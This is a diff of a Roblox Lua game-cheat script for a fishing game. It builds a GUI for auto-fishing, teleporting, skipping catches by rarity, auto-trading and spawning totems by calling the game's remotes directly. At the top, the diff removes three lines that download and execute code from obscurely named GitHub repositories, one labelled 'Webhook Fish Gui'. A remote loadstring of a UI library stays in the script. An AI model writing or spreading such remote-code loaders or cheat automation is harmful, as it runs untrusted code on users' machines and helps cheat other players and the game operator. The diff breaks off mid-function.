@@ -1,6 +1,3 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/fewnbhefbevfhevfdfveh/ckhsuciceifgeufhefveyfg/refs/heads/main/fwefefhef%20Gui%20Update"))()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/fewnbhefbevfhevfdfveh/ckhsuciceifgeufhefveyfg/refs/heads/main/Webhook%20Fish%20Gui%20dywfywgfwyfvwydgvy"))()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/xwvufdwgqudwyfwdvwedyuvwd/gbewufbeufbeugfvr/refs/heads/main/Semua"))()
 local MacLib = loadstring(game:HttpGet("https://raw.githubusercontent.com/Enow-Development/maclib-extended/refs/heads/main/maclib.lua"))()
 
 -- Deklarasi service dan variabel utama (tidak diubah) jangan di ubah ubah sama sekali
@@ -14,25 +11,6 @@ local RunService = game:GetService("RunService")
 local LocalPlayer = player -- alias supaya sama dengan LocalPlayer
 local MenuRings = workspace["!!! MENU RINGS"]
 local PlayerGui = player:WaitForChild("PlayerGui")
-
-
--- Anti Afk
-local SHOW_EVERY = 15 * 60 -- 15 menit
-local SHOW_TIME = 3        -- tampil 3 detik
-
-local UserInputService = game:GetService("UserInputService")
-
-local function showCursor()
-    UserInputService.MouseIconEnabled = true
-    task.wait(SHOW_TIME)
-    UserInputService.MouseIconEnabled = false
-end
-
-task.spawn(function()
-    while task.wait(SHOW_EVERY) do
-        showCursor()
-    end
-end)
 
 
 local GameData = {
@@ -65,6 +43,65 @@ local GameData = {
     DiscordAPI = "",
     ServerInfoParagraph = nil,
     AutoRefresh = false,
+
+   -- ================== [Auto Trade] ==================
+
+	-----------------------------------------------------
+	-- TIER DATA
+	-----------------------------------------------------
+	TierMap001 = {
+		[1] = "Common",
+		[2] = "Uncommon",
+		[3] = "Rare",
+		[4] = "Epic",
+		[5] = "Legendary",
+		[6] = "Mythic",
+		[7] = "SECRET"
+	},
+
+	TierList001 = {
+		"Common","Uncommon","Rare","Epic","Legendary","Mythic","SECRET"
+	},
+
+	-----------------------------------------------------
+	-- CORE
+	-----------------------------------------------------
+	RS = ReplicatedStorage,
+	Players = Players,
+	player = Players.LocalPlayer,
+
+	Net = require(ReplicatedStorage.Packages.Net),
+	ReplionClient = require(ReplicatedStorage.Packages.Replion).Client,
+	DataReplion = nil,
+
+	ItemUtility = require(ReplicatedStorage.Shared.ItemUtility),
+
+	TradeRemote = ReplicatedStorage
+		:WaitForChild("Packages")
+		:WaitForChild("_Index")
+		:WaitForChild("sleitnick_net@0.2.0")
+		:WaitForChild("net")
+		:WaitForChild("RF/InitiateTrade"),
+
+	ItemsFolder = ReplicatedStorage:WaitForChild("Items"),
+
+	-----------------------------------------------------
+	-- STATE
+	-----------------------------------------------------
+	state = {
+		selectedTiers = {},
+		Auto2Trade = false,
+		stopTrade = false,
+		targetPlayer = "",
+		fishTarget = 0,
+		fishCount = 0
+	},
+
+	TierList = nil,
+	nameToTier = {},
+
+	notifGui = nil,
+	notifFrame = nil,
 
     -- ==================[Jenis Ikan v1]==================
 
@@ -197,6 +234,24 @@ local GameData = {
         ["Froen Boat"] = 11, ["Cruiser Boat"] = 13, ["Rubber Ducky"] = 16
     },
 
+    -- ================== [Traveling Merchant] ==================
+
+    ReplicatedStorage = game:GetService("ReplicatedStorage"),
+
+    Replion = nil,
+    Merchant = nil,
+
+    MarketItemData = nil,
+    ItemUtility = nil,
+
+    PurchaseRF = nil,
+
+    SelectedMarketIDs = {},
+    AutoPurchase = false,
+
+    MerchantParagraph = nil,
+    MerchantDropdown = nil,
+
     -- ================== [Quest] ==================
     Quests = {
         ["Deep Sea"] = {
@@ -316,23 +371,35 @@ local GameData = {
 
     Jungle = workspace:WaitForChild("JUNGLE INTERACTIONS"),
 
-    ParagraphStatus = nil, -- nanti diisi setelah dibuat UI-nya
+    -- ================== [Lochness Paragraph] ==================
 
-    -- Data tambahan
-    targetCFrame = CFrame.new(
+    Workspace = workspace,
+
+    CountdownLabel = nil,
+    CountdownParagraph = nil,
+
+    UpdateDelay = 1,
+
+    -- ================== [Lochness Teleport] ==================
+
+    Players = game:GetService("Players"),
+    Workspace = workspace,
+
+    LocalPlayer = nil,
+    TimerLabel = nil,
+
+    TargetCFrame = CFrame.new(
         6089.81396, -585.924194, 4637.24023,
         -0.800617278, 5.49377476e-08, 0.599176049,
         6.29061105e-08, 1, -7.63340946e-09,
         -0.599176049, 3.15803952e-08, -0.800617278
     ),
 
-    enabled = false,
-    
-    -- Placeholder variabel lain
-    label = nil,
-    hrp = nil,
-    paragraph = nil,
-    freeze = nil,
+    AutoLochEnabled = false,
+    SavedCFrame = nil,
+    Teleporting = false,
+
+    LoopDelay = 1,
 
     -- ================== [Disco Paragraph] ==================
     DiscoParagraph = nil,
@@ -348,35 +415,39 @@ local GameData = {
     DiscoRoot = workspace.ClassicEvent.DiscoEvent.DiscoBall:WaitForChild("Root"),
     Players = game:GetService("Players"),
 
-    -- ================== [Totems] ==================
+    -- ================== [Totems Info Paragraph] ==================
 
     ReplicatedStorage = game:GetService("ReplicatedStorage"),
 
-    -- ================== [Blatant V1] ==================
+    Client = nil,
+    Data = nil,
 
-    RS = game:GetService("ReplicatedStorage"),
-    Players = game:GetService("Players"),
+    TotemParagraph = nil,
 
-    LP = nil,
+    TotemCount = {
+        Luck = 0,
+        Mutation = 0,
+        Shiny = 0,
+    },
 
-    net = nil,
+    -- ================== [Totems] ==================
 
-    RF_Charge = nil,
-    RF_Start = nil,
-    RF_Cancel = nil,
-    RE_Finish = nil,
-    RE_Equip = nil,
+    ReplicatedStorage = game:GetService("ReplicatedStorage"),
+    Client = nil,
+    Data = nil,
 
-    enabled = false,
-    CancelDelay = 1.05,
-    CompleteDelay = 0.16,
+    SpawnTotemRE = nil,
 
-    EquipTool = nil,
-    FastFish = nil,
-    StartLoop = nil,
-    StopLoop = nil,
+    TotemMap = {
+        ["Luck Totem"] = 1,
+        ["Mutation Totem"] = 2,
+        ["Shiny Totem"] = 3,
+    },
 
-    -- ================== [Blatant V2] ==================
+    SelectedTotemId = nil,
+    SpawnToggle = false,
+
+    -- ================== [Blatant ] ==================
 
     SVC = {
         RS = game:GetService("ReplicatedStorage")
@@ -395,106 +466,38 @@ local GameData = {
     startBlatantV2 = nil,
 
     -- ================== [Treasure] ==================
-    Players = game:GetService("Players"),
-    Player = nil,
-    Character = nil,
-    HRP = nil,
 
-    AutoTreasure = false,
-    AutoTreasureThread = nil,
-
-    GetAllSunkenModels = nil,
-    ProcessOneWreckage = nil,
-    AutoTreasureLoop = nil,
-
-    TempList = nil,
-    TempTreasure = nil,
-    TempShine = nil,
-    TempPrompt = nil,
 
     -- ================== [Event Hunt] ==================
 
-        --// Services
+
+    -- ================== [SKip Rraity] ==================
+
     Players = game:GetService("Players"),
     RS = game:GetService("ReplicatedStorage"),
 
-    -- Player
-    player = game:GetService("Players").LocalPlayer,
-    char = nil,
-    hrp = nil,
+    player = nil,
 
-    -- Folders
-    exclaimFolder = nil,
+    net = nil,
+    RF_CancelFishing = nil,
+    RE_TextEffect = nil,
 
-    -- Event List
-    eventsList = {
-        "Shark Hunt", "Ghost Shark Hunt", "Worm Hunt",
-        "Black Hole", "Shocked", "Ghost Worm",
-        "Meteor Rain", "Megalodon Hunt"
+    RARITY_COLORS = {
+        Common   = {1, 0.980392, 0.964706},
+        Uncommon = {0.764706, 1, 0.333333},
+        Rare     = {0.333333, 0.635294, 1},
+        Epic     = {0.678431, 0.309804, 1},
     },
 
-    -- Auto settings
-    SelectedAutoEvents = {},
-    AutoEventPriority = {},
-    AutoEventToggle = false,
+    lastProcessed = {},
+    COOLDOWN = 1,
 
-    savedCFrame = nil,
+    -- ================== [Fish Caught] ==================
 
-    -- Runtime objects
-    platform = nil,
-    atEvent = false,
-
-    -- ================== [SKip Rraity] ==================
-        SVC = {
-        Players = game:GetService("Players"),
-        RS = game:GetService("ReplicatedStorage")
-    },
-
-    Player = nil,
-    Net = nil,
-
-    RF = {},
-    RE = {},
-
-    SkipState = {
-        Enabled = false,
-        Blacklist = { "Common" }
-    },
-
-    BAD_COLORS = {
-        Common    = {1, 0.980392, 0.964706},
-        Uncommon  = {0.764706, 1, 0.333333},
-        Rare      = {0.333333, 0.635294, 1},
-        Epic      = {0.678431, 0.309804, 1},
-    },
-
-    LastProcessed = {},
-    PROCESS_COOLDOWN = 1.0,
-
-    -- ================== [Fishing Counter] ==================
-
-    PlayerGui = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"),
-
-    -- Fishing Notification References
-    smallNotif = nil,
-    display = nil,
-    container = nil,
-    notifications = nil,
-    notifFrame = nil,
-
-    -- Counter numbers
-    successCount = 0,
-    failCount = 0,
-
-    -- Connections
-    successConn = nil,
-    failConn = nil,
-
-    -- UI Objects
-    fishingCounter = nil,
-
-    -- Success Position
-    successPos = UDim2.new(0.5, 0, 0.1, 0),
+    ReplicatedStorage = game:GetService("ReplicatedStorage"),
+    REFishCaught = nil,
+    FishCount = 0,
+    FishCountParagraph = nil,
 
     -- ================== [Image Botton] ==================
 
@@ -626,6 +629,15 @@ local GameData = {
     PlaceId = game.PlaceId,
     targetJobId = "",
     JobIdLabel = nil,
+
+    -- ================== [Boost FPS] ==================
+
+    Lighting = game:GetService("Lighting"),
+    Workspace = game:GetService("Workspace"),
+    Terrain = nil,
+
+    MinecraftFPS = false,
+    FPSLoop = nil,
 }
 
 --====================================================--
@@ -747,7 +759,6 @@ local sections = {
     Fishing1 = tabs.Fishing:Section({ Side = "Full" }),
 	Fishing2 = tabs.Fishing:Section({ Side = "Full" }),
     Fishing3 = tabs.Fishing:Section({ Side = "Full" }),
-	Fishing4 = tabs.Fishing:Section({ Side = "Full" }),
     Fishing5 = tabs.Fishing:Section({ Side = "Full" }),
     Fishing6 = tabs.Fishing:Section({ Side = "Full" }),
     Fishing7 = tabs.Fishing:Section({ Side = "Full" }),
@@ -762,12 +773,14 @@ local sections = {
 
     Auto = tabs.Auto:Section({ Side = "Full" }),
     Auto1 = tabs.Auto:Section({ Side = "Full" }),
+    Auto2 = tabs.Auto:Section({ Side = "Full" }),
 
     Shop = tabs.Shop:Section({ Side = "Full" }),
     Shop1 = tabs.Shop:Section({ Side = "Full" }),
     Shop2 = tabs.Shop:Section({ Side = "Full" }),
     Shop3 = tabs.Shop:Section({ Side = "Full" }),
     Shop4 = tabs.Shop:Section({ Side = "Full" }),
+    Shop5 = tabs.Shop:Section({ Side = "Full" }),
 
     Boat = tabs.Boat:Section({ Side = "Full" }),
     Boat1 = tabs.Boat:Section({ Side = "Full" }),
@@ -781,9 +794,30 @@ local sections = {
     Player2 = tabs.Player:Section({ Side = "Full" }),
 
     Config = tabs.Config:Section({ Side = "Full" }),
+    Config1 = tabs.Config:Section({ Side = "Full" }),
 }
 
+
+
 sections.Home:Header({
+	Name = "What's New?"
+})
+
+sections.Home:Paragraph({
+    Header = "Update List",
+    Body = [[
+[/] Rework Fishing Counter to Fish Caught
+[-] Delete Blatant v1
+[!] Fixed Skip Rarity not working
+[/] Improve Auto Totems
+[+] Addded Traveling Merchant 
+ - Status Info Stock Merchant
+ - Dropdwon Select MarketId
+[-] Delete Reduce Lag
+]]
+}, "Info")
+
+sections.Home1:Header({
 	Name = "User Info"
 })
 
@@ -808,7 +842,7 @@ end
 
 GameData.executorName = GameData.detect_executor()
 
-GameData.executorParagraph = sections.Home:Paragraph({
+GameData.executorParagraph = sections.Home1:Paragraph({
     Header = "Executor Detector Exploits",
     Body = "Current Executor: " .. tostring(GameData.executorName)
 }, "ExecutorParagraph")
@@ -819,7 +853,7 @@ task.delay(1, function()
 end)
 
 
-sections.Home1:Header({
+sections.Home2:Header({
 	Name = "Redem Code & Reward"
 })
 
@@ -832,7 +866,7 @@ local NetFolder = ReplicatedStorage:WaitForChild("Packages")
 
 local RedeemRF = NetFolder:WaitForChild("RF/RedeemCode")
 
-sections.Home1:Button({
+sections.Home2:Button({
 	Name = "Redeem All Codes",
 	Callback = function()
 
@@ -873,7 +907,7 @@ sections.Home1:Button({
 })
 
 
-sections.Home1:Button({ 
+sections.Home2:Button({ 
     Name = "Auto Claim Event Reward", 
     Callback = function()
         local ReplicatedStorage = game:GetService("ReplicatedStorage")
@@ -892,7 +926,7 @@ sections.Home1:Button({
     end,
 })
 
-sections.Home2:Header({
+sections.Home3:Header({
 	Name = "Discord Server Info"
 })
 
@@ -904,7 +938,7 @@ GameData.HttpService = game:GetService("HttpService")
 
 
 -- BUAT PARAGRAPH UI
-GameData.ServerInfoParagraph = sections.Home2:Paragraph({
+GameData.ServerInfoParagraph = sections.Home3:Paragraph({
     Header = "Discord Server Info",
     Body = "Click refresh to load."
 }, "Info")
@@ -946,7 +980,7 @@ end
 
 
 -- BUTTON REFRESH MANUAL
-sections.Home2:Button({
+sections.Home3:Button({
     Name = "Refresh Server Info",
     Callback = function()
         GameData.ServerInfoParagraph:UpdateBody("Loading...")
@@ -956,7 +990,7 @@ sections.Home2:Button({
 
 
 -- TOGGLE AUTO REFRESH (3 DETIK)
-sections.Home2:Toggle({
+sections.Home3:Toggle({
     Name = "Auto Refresh Server Info",
     Default = false,
     Callback = function(value)
@@ -978,7 +1012,7 @@ sections.Home2:Toggle({
     end,
 }, "AutoRefreshServerInfoToggle")
 
-sections.Home2:Button({
+sections.Home3:Button({
     Name = "Copy Discord Link",
     Callback = function()
         local discordLink = "https://discord.gg/ECxQFc97F5"
@@ -992,123 +1026,95 @@ sections.Home2:Button({
 })
 
 
-sections.Home3:Header({
-	Name = "What's New?"
-})
-
-sections.Home3:Paragraph({
-    Header = "Update List",
-    Body = [[
-[+] Added Executor Detector
-[+] Added Job Id Teleport Service
-[+] Added Copy Job Id Button
-[+] Added Rejoin Server Button
-[+] Added Server Hop Botton
-[/] Improved UI
-[+] Added Discord
-[+] Added Discord Link Copied Button
-[!] Fixed some bugs
-[/] Fixed Anti AFK
-]]
-}, "Info")
-
-
 sections.Fishing:Header({
 	Name = "Status Info Event"
 })
 
--- ============================================================
--- Update HRP ketika respawn
--- ============================================================
-local function UpdateHRP(char)
-    local newhrp = char:WaitForChild("HumanoidRootPart", 5)
-    if newhrp then
-        GameData.hrp = newhrp
-    end
-end
+GameData.CountdownLabel =
+    GameData.Workspace["!!! MENU RINGS"]["Event Tracker"]
+        .Main.Gui.Content.Items.Countdown.Label
 
-if player.Character then
-    UpdateHRP(player.Character)
-end
 
-player.CharacterAdded:Connect(function(char)
-    task.wait(1)
-    UpdateHRP(char)
-
-    if GameData.freeze then
-        GameData.freeze:Destroy()
-        GameData.freeze = nil
-    end
-end)
-
--- ============================================================
--- Label Countdown dari MenuRings
--- ============================================================
-GameData.label = MenuRings["Event Tracker"].Main.Gui.Content.Items.Countdown.Label
-
--- ============================================================
--- Paragraph WindUI (update setiap detik)
--- ============================================================
-GameData.paragraph = sections.Fishing:Paragraph({
+GameData.CountdownParagraph = sections.Fishing:Paragraph({
     Header = "Lochness Monster Countdown",
-    Body = GameData.label.Text
-}, nil)
+    Body = "Waiting..."
+}, "Lochness Monster Countdown")
+
 
 task.spawn(function()
     while true do
-        if GameData.paragraph and GameData.label then
-            GameData.paragraph:UpdateBody(GameData.label.Text)
+        if GameData.CountdownLabel and GameData.CountdownLabel:IsA("TextLabel") then
+            GameData.CountdownParagraph:UpdateBody(
+                GameData.CountdownLabel.Text
+            )
+        else
+            GameData.CountdownParagraph:UpdateBody("Countdown not found")
         end
-        task.wait(1)
+
+        task.wait(GameData.UpdateDelay)
     end
 end)
 
--- ============================================================
--- Toggle Auto Lochness
--- ============================================================
+
+
+GameData.LocalPlayer = GameData.Players.LocalPlayer
+
+GameData.TimerLabel =
+    GameData.Workspace["!!! MENU RINGS"]["Event Tracker"]
+        .Main.Gui.Content.Items.Stats.Timer.Label
+
 sections.Fishing:Toggle({
     Name = "Auto Lochness Monster",
     Default = false,
     Callback = function(value)
-        GameData.enabled = value
+        GameData.AutoLochEnabled = value
+
         Window:Notify({
-            Title = "Auto Lochness Monster",
-            Description = (value and "Enabled " or "Disabled ") .. "Lochness Monster"
+            Title = "Lochness Monster",
+            Description = (value and "Enabled" or "Disabled")
         })
-    end,
-}, "AutoLochnessMonsterToggle")
 
--- ============================================================
--- Loop utama (teleport & freeze)
--- ============================================================
-task.spawn(function()
-    while true do
-        if GameData.enabled
-        and GameData.label
-        and GameData.label.Text == "0H 1M 10S"
-        and GameData.hrp
-        then
-            -- TELEPORT
-            GameData.hrp.CFrame = GameData.targetCFrame
+        if not value then
+            local char = GameData.LocalPlayer.Character
+            local hrp = char and char:FindFirstChild("HumanoidRootPart")
 
-            -- FREEZE
-            GameData.freeze = Instance.new("BodyVelocity")
-            GameData.freeze.Velocity = Vector3.zero
-            GameData.freeze.MaxForce = Vector3.new(1e5, 1e5, 1e5)
-            GameData.freeze.Parent = GameData.hrp
-
-            task.wait(2)
-
-            -- UNFREEZE
-            if GameData.freeze then
-                GameData.freeze:Destroy()
-                GameData.freeze = nil
+            if hrp and GameData.SavedCFrame then
+                hrp.CFrame = GameData.SavedCFrame
             end
 
-            task.wait(1)
+            GameData.SavedCFrame = nil
+            GameData.Teleporting = false
         end
+    end
+}, "LochnessMonsterToggle")
 
-        task.wait(0.1)
+task.spawn(function()
+    while true do
+        if GameData.AutoLochEnabled
+        and GameData.TimerLabel
+        and GameData.TimerLabel:IsA("TextLabel") then
+
+            local text = GameData.TimerLabel.Text
+            local char = GameData.LocalPlayer.Character
+            local hrp = char and char:FindFirstChild("HumanoidRootPart")
+
+            if hrp then
+                if text ~= "0M 0S LEFT" then
+                    if not GameData.Teleporting then
+                        GameData.SavedCFrame = hrp.CFrame
+                        GameData.Teleporting = true
+                    end
+                    hrp.CFrame = GameData.TargetCFrame
+                else
+                    if GameData.Teleporting and GameData.SavedCFrame then
+                        hrp.CFrame = GameData.SavedCFrame
+                    end
+                    GameData.Teleporting = false
+                    GameData.SavedCFrame = nil
+                end
+            end
+        end
+        task.wait(GameData.LoopDelay)
     end
 end)
 
@@ -1259,93 +1265,38 @@ end
 
 sections.Fishing1:Divider()
 
-GameData.smallNotif = GameData.PlayerGui:FindFirstChild("Small Notification")
-GameData.display = GameData.smallNotif and GameData.smallNotif:FindFirstChild("Display")
-GameData.container = GameData.display and GameData.display:FindFirstChild("Container")
+GameData.REFishCaught =
+    GameData.ReplicatedStorage
+        .Packages
+        ._Index["sleitnick_net@0.2.0"]
+        .net["RE/FishCaught"]
 
-GameData.notifications = GameData.PlayerGui:FindFirstChild("Text Notifications")
-GameData.notifFrame = GameData.notifications and GameData.notifications:FindFirstChild("Frame")
+GameData.FishCountParagraph = sections.Fishing1:Paragraph({
+    Header = "Fish Caught",
+    Body = "Total: 0"
+}, "FishCaughtCount")
 
--- Buat counter UI
--- (asumsikan `sections.Fishing:Paragraph` tersedia di environment)
-GameData.fishingCounter = sections.Fishing1:Paragraph({
-    Header = "🎣 Fishing Counter",
-    Body = "✅ Success: 0  |  ❌ Failed: 0"
-}, "FishingCounterFlag")
+GameData.REFishCaught.OnClientEvent:Connect(function(fishName, data)
+    GameData.FishCount = GameData.FishCount + 1
 
--- ============================================================
--- UPDATE COUNTER FUNCTION
--- ============================================================
-function GameData.updateCounter()
-    if GameData.fishingCounter and GameData.fishingCounter.UpdateBody then
-        GameData.fishingCounter:UpdateBody(
-            '<font color="rgb(0,255,0)">✅ Success: ' .. GameData.successCount .. '</font>' ..
-            '  |  ' ..
-            '<font color="rgb(255,0,0)">❌ Failed: ' .. GameData.failCount .. '</font>'
-        )
+    local lines = {
+        "Total: " .. GameData.FishCount
+    }
+
+    if fishName ~= nil then
+        table.insert(lines, "Last Fish: " .. tostring(fishName))
     end
-end
 
--- ============================================================
--- SUCCESS DETECTOR
--- ============================================================
-if GameData.container then
-    GameData.successConn = GameData.container:GetPropertyChangedSignal("Position"):Connect(function()
-        -- bandingkan dengan successPos
-        if GameData.container.Position == GameData.successPos then
-            GameData.successCount = GameData.successCount + 1
-            GameData.updateCounter()
+    if type(data) == "table" then
+        for key, value in pairs(data) do
+            table.insert(lines, tostring(key) .. ": " .. tostring(value))
         end
-    end)
-else
-    warn("Container not found; success detector not connected.")
-end
+    end
 
--- ============================================================
--- FAIL DETECTOR
--- ============================================================
-if GameData.notifFrame then
-    GameData.failConn = GameData.notifFrame.ChildAdded:Connect(function(child)
-        if child and child.Name == "TextTile" then
-            local header = child:FindFirstChild("Header")
-            if header and header:IsA("TextLabel") then
-
-                -- Direct spawn text
-                if header.Text == "The fish got away!" then
-                    GameData.failCount = GameData.failCount + 1
-                    GameData.updateCounter()
-                end
-
-                -- If text changes after spawn (lindungi reference header)
-                header:GetPropertyChangedSignal("Text"):Connect(function()
-                    -- pastikan header masih ada dan adalah TextLabel
-                    if header and header:IsA("TextLabel") and header.Text == "The fish got away!" then
-                        GameData.failCount = GameData.failCount + 1
-                        GameData.updateCounter()
-                    end
-                end)
-            end
-        end
-    end)
-else
-    warn("notifFrame not found; fail detector not connected.")
-end
-
--- ============================================================
--- INITIALIZE UI
--- ============================================================
-if GameData.fishingCounter and GameData.fishingCounter.SetVisibility then
-    GameData.fishingCounter:SetVisibility(true)
-end
-GameData.updateCounter()
-
--- ============================================================
--- CLEANUP FUNCTION
--- ============================================================
-function GameData.cleanup()
-    if GameData.successConn then GameData.successConn:Disconnect() end
-    if GameData.failConn then GameData.failConn:Disconnect() end
-end
+    GameData.FishCountParagraph:UpdateBody(
+        table.concat(lines, "\n")
+    )
+end)
 
 sections.Fishing1:Header({
 	Name = "Fishing Feature"
@@ -1585,9 +1536,7 @@ local function setGameAnimationsEnabled(state)
     })
 end
 
--- =====================================================================
--- Toggle WindUI (Format Baru)
--- =====================================================================
+
 
 sections.Fishing1:Toggle({
     Name = "No Animation",
@@ -1603,134 +1552,102 @@ sections.Fishing1:Toggle({
     end,
 })
 
+-- ========= [Skip Rarity] =========
 
-GameData.Player = GameData.SVC.Players.LocalPlayer
-GameData.Net = GameData.SVC.RS.Packages._Index["sleitnick_net@0.2.0"]:WaitForChild("net")
+_G.RarityFilterEnabled = false
+_G.BlacklistedRarity = { "Common" }
 
-GameData.RF.CancelFishing = GameData.Net:WaitForChild("RF/CancelFishingInputs")
-GameData.RE.ReplicateTextEffect = GameData.Net:WaitForChild("RE/ReplicateTextEffect")
+GameData.player = GameData.Players.LocalPlayer
 
+GameData.net = GameData.RS.Packages._Index["sleitnick_net@0.2.0"].net
+GameData.RF_CancelFishing = GameData.net:WaitForChild("RF/CancelFishingInputs")
+GameData.RE_TextEffect = GameData.net:WaitForChild("RE/ReplicateTextEffect")
 
---========================================================--
--- UI HANDLERS
---========================================================--
 sections.Fishing1:Toggle({
-	Name = "Skip Rarity",
-	Default = false,
-	Callback = function(state)
-
-		-- Sistem status toggle
-		GameData.toggleStatus["Skip Rarity"] = state
-		GameData.UpdateStatusLabel()
-
-		-- Logic asli kamu
-		GameData.SkipState.Enabled = state
-
-		Window:Notify({
-			Title = "Skip Rarity",
-			Description = (state and "Enabled" or "Disabled")
-		})
-	end,
+    Name = "Skip Rarity",
+    Default = false,
+    Callback = function(value)
+        _G.RarityFilterEnabled = value
+        Window:Notify({
+            Title = "Skip Rarity",
+            Description = (value and "Enabled" or "Disabled")
+        })
+    end,
 }, "SkipRarityToggle")
 
-
 sections.Fishing1:Dropdown({
-	Name = "Rarity Filters",
-	Search = true,
-	Multi = true,
-	Required = false,
-	Options = { "Common", "Uncommon", "Rare", "Epic" },
-	Default = { "Common" },
+    Name = "Skip Rarity List",
+    Search = true,
+    Multi = true,
+    Required = false,
+    Options = {
+        "Common",
+        "Uncommon",
+        "Rare",
+        "Epic"
+    },
+    Default = {
+        "Common"
+    },
+    Callback = function(Value)
+        local Selected = {}
+        for rarity, state in next, Value do
+            if state then
+                table.insert(Selected, rarity)
+            end
+        end
+        _G.BlacklistedRarity = Selected
+    end,
+}, "SkipRarityDropdown")
 
-	Callback = function(Value)
-		local selections = {}
-
-		for rarity, isEnabled in next, Value do
-			if isEnabled then
-				table.insert(selections, rarity)
-			end
-		end
-
-		GameData.SkipState.Blacklist = selections
-	end,
-}, "BlacklistRarity")
-
-
---========================================================--
--- UTILITIES (masuk GameData)
---========================================================--
-function GameData.approx(a, b, tolerance)
-	return math.abs(a - b) <= (tolerance or 0.02)
+function GameData.approx(a, b, tol)
+    return math.abs(a - b) <= (tol or 0.02)
 end
 
-function GameData.isColor(r, g, b, R, G, B)
-	return GameData.approx(r, R) and GameData.approx(g, G) and GameData.approx(b, B)
-end
-
-function GameData.extractColorFromTextData(colorValue)
-	if typeof(colorValue) == "Color3" then return colorValue end
-	if typeof(colorValue) == "ColorSequence" then
-		if #colorValue.Keypoints > 0 then
-			return colorValue.Keypoints[1].Value
-		end
-	end
-	return nil
+function GameData.isColor(r,g,b,R,G,B)
+    return GameData.approx(r,R) and GameData.approx(g,G) and GameData.approx(b,B)
 end
 
 function GameData.detectRarity(color3)
-	if not color3 then return "UNKNOWN" end
-
-	local r,g,b = color3.R, color3.G, color3.B
-
-	for rarity, col in pairs(GameData.BAD_COLORS) do
-		if GameData.isColor(r, g, b, col[1], col[2], col[3]) then
-			return rarity
-		end
-	end
-
-	return "UNKNOWN"
+    if not color3 then return "UNKNOWN" end
+    for rarity, c in pairs(GameData.RARITY_COLORS) do
+        if GameData.isColor(color3.R, color3.G, color3.B, c[1], c[2], c[3]) then
+            return rarity
+        end
+    end
+    return "UNKNOWN"
 end
 
+GameData.RE_TextEffect.OnClientEvent:Connect(function(data)
+    if not _G.RarityFilterEnabled then return end
+    if not data or not data.TextData then return end
+    if data.TextData.EffectType ~= "Exclaim" then return end
 
---========================================================--
--- MAIN FILTER LOGIC
---========================================================--
-pcall(function()
-	local event = GameData.RE.ReplicateTextEffect
-	if event and event.OnClientEvent then
+    local head = GameData.player.Character and GameData.player.Character:FindFirstChild("Head")
+    if data.Container ~= head then return end
 
-		event.OnClientEvent:Connect(function(data)
-			if not GameData.SkipState.Enabled then return end
-			if not (data and data.TextData and data.TextData.TextColor and data.TextData.EffectType == "Exclaim") then
-				return
-			end
+    local id = tostring(data)
+    if GameData.lastProcessed[id] and tick() - GameData.lastProcessed[id] < GameData.COOLDOWN then
+        return
+    end
+    GameData.lastProcessed[id] = tick()
 
-			local head = GameData.Player.Character and GameData.Player.Character:FindFirstChild("Head")
-			if not head then return end
-			if data.Container ~= head then return end
+    local color = data.TextData.TextColor
+    if typeof(color) == "ColorSequence" then
+        color = color.Keypoints[1].Value
+    end
+    if typeof(color) ~= "Color3" then return end
 
-			local id = tostring(data.InstanceId or data.Id or data)
-			local now = tick()
+    local rarity = GameData.detectRarity(color):upper()
 
-			if GameData.LastProcessed[id] and now - GameData.LastProcessed[id] < GameData.PROCESS_COOLDOWN then
-				return
-			end
-			GameData.LastProcessed[id] = now
-
-			local color3 = GameData.extractColorFromTextData(data.TextData.TextColor)
-			local rarity = GameData.detectRarity(color3)
-
-			for _, blk in ipairs(GameData.SkipState.Blacklist) do
-				if string.upper(blk) == string.upper(rarity) then
-					pcall(function()
-						GameData.RF.CancelFishing:InvokeServer()
-					end)
-					break
-				end
-			end
-		end)
-	end
+    for _, blocked in ipairs(_G.BlacklistedRarity) do
+        if blocked:upper() == rarity then
+            GameData.RF_CancelFishing:InvokeServer()
+            return
+        end
+    end
 end)
+
 
 -- ========= [Cancel Fishing] =========
 -- Ambil RemoteFunction CancelFishing
@@ -1783,7 +1700,7 @@ local function StartFishingCycle()
     GameData.lastCatchTime = os.clock()
 
     GameData.ChargeFishingRod:InvokeServer()
-    if not SafeWait(0.01) then return end
+    if not SafeWait(0.1) then return end
 
     GameData.RequestFishingMinigameStarted:InvokeServer(unpack(GameData.miniggameArgs))
 end
@@ -1793,7 +1710,7 @@ end
 -- ==========================================================
 task.spawn(function()
     while true do
-        task.wait(1)
+        task.wait(0.1)
 
         if GameData.autoFishingEnabled and GameData.isFishing then
             if os.clock() - GameData.lastCatchTime >= GameData.antiStuckTime then
@@ -1805,7 +1722,7 @@ task.spawn(function()
                 end)
 
                 GameData.isFishing = false
-                task.wait(0.01)
+                task.wait(0.1)
 
                 StartFishingCycle()
             end
@@ -1936,206 +1853,126 @@ sections.Fishing3:Header({
 	Name = "Totems"
 })
 
--- Modules
 GameData.Client = require(GameData.ReplicatedStorage.Packages.Replion).Client
-GameData.ItemUtility = require(GameData.ReplicatedStorage.Shared.ItemUtility)
+GameData.Data = GameData.Client:WaitReplion("Data")
 
--- Data
-GameData.data = GameData.Client:WaitReplion("Data")
-GameData.inventory = GameData.data:GetExpect("Inventory")
+GameData.TotemParagraph = sections.Fishing3:Paragraph({
+    Header = "Totem Info",
+    Body =
+        "Luck Totem: 0\n" ..
+        "Mutation Totem: 0\n" ..
+        "Shiny Totem: 0"
+}, "TotemCountParagraph")
 
--- Remote
-GameData.SpawnTotem = GameData.ReplicatedStorage
-    :WaitForChild("Packages")
-    :WaitForChild("_Index")
-    :WaitForChild("sleitnick_net@0.2.0")
-    :WaitForChild("net")
-    :WaitForChild("RE/SpawnTotem")
+function GameData.UpdateTotemCount()
+    local inventory = GameData.Data:GetExpect({"Inventory"})
 
--- Totem IDs
-GameData.TOTEM_IDS = {
-    ["Luck Totem"] = 1,
-    ["Mutation Totem"] = 2,
-    ["Shiny Totem"] = 3,
-}
+    if not inventory or not inventory.Totems then
+        GameData.TotemParagraph:UpdateBody("Totems not found")
+        return
+    end
 
--- State
-GameData.selectedTotem = nil
-GameData.autoSpawn = false
-GameData.id = nil
-GameData.uuid = nil
+    GameData.TotemCount.Luck = 0
+    GameData.TotemCount.Mutation = 0
+    GameData.TotemCount.Shiny = 0
 
+    for _, totem in ipairs(inventory.Totems) do
+        if totem.Id == 1 then
+            GameData.TotemCount.Luck += 1
